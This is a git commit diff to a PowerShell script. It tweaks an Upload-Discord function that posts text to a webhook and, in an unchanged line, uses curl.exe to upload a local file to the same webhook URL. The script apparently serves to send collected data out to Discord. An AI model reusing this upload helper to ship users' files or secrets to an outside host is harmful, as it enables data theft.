cc3eb49bee47fe6bf61a516debc36bd944f1d615
FraitRed <136161358+FraitRed@users.noreply.github.com>
2024-05-17 11:46:45 +0300

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -22,7 +22,7 @@ function Upload-Discord {
   }
  
   if (-not ([string]::IsNullOrEmpty($text))){
-  Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+  Invoke-RestMethod -ContentType 'Application/Json' -UseBasicParsing -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
  
   if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
   }
